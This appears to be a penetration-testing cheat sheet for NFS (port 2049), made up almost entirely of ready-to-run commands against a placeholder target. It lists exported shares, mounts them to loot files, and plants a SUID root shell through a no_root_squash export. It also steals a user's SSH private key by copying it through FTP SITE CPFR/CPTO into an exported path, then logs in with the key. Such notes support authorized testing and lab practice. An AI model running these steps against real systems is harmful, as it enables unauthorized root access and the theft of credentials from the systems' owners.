# 2049 - NFS

`2049/tcp open nfs 3-4 (RPC #100003)`

## Commands

### Mount Discovery

#NFS #Enumeration #Linux
List exported NFS mounts.

```sh
showmount -e <TARGET_IP>
```

### Mount Share

#NFS #Looting #Linux
Mount an exported NFS share, inspect/copy files, then unmount it.

```sh
# Create local mount directory.
mkdir nfs_mount

# Mount exported NFS share.
sudo mount -t nfs <TARGET_IP>:/<REMOTE_SHARE> nfs_mount -o nolock,vers=3

# List mounted files.
ls -la nfs_mount

# Copy interesting files locally.
cp nfs_mount/<FILE> .

# Unmount NFS share.
sudo umount nfs_mount
```

### no_root_squash Privesc

#NFS #Linux #PrivilegeEscalation
If an exported NFS share has `no_root_squash`, mount it from the attacker box as root, create a SUID shell, then execute it on the target.

```sh
# Target or attacker: confirm exported shares and look for no_root_squash if /etc/exports is readable.
showmount -e <TARGET_IP>
cat /etc/exports 2>/dev/null | grep no_root_squash

# Attacker: mount the exported share.
mkdir nfs_privesc
sudo mount -t nfs <TARGET_IP>:/<REMOTE_SHARE> ./nfs_privesc -o nolock,vers=3

# Attacker as root: create a SUID bash copy inside the mounted share.
sudo cp /bin/bash ./nfs_privesc/rootbash
sudo chmod +s ./nfs_privesc/rootbash

# Target: execute the SUID bash from the mounted/exported path.
/<EXPORTED_PATH>/rootbash -p
id && whoami
```

### RPCBind NFS Loot Via FTP Copy

#FTP #NFS #Looting #Linux
If NFS exports are exposed through RPCBind and FTP allows `SITE CPFR/CPTO`, copy a private key into an exported path, mount it, then SSH with the key.

```sh
# Enumerate RPCBind/NFS exports.
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <TARGET_IP>

# FTP: copy a readable private key into an NFS-exported writable/readable path.
nc <TARGET_IP> 21
SITE CPFR /home/<USER>/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

# Attacker: mount the exported path and retrieve the copied key.
mkdir nfs_loot
sudo mount -t nfs <TARGET_IP>:/var ./nfs_loot -o nolock,vers=3
cp ./nfs_loot/tmp/id_rsa .
chmod 600 id_rsa

# Use the looted private key.
ssh -i id_rsa <USER>@<TARGET_IP>
```
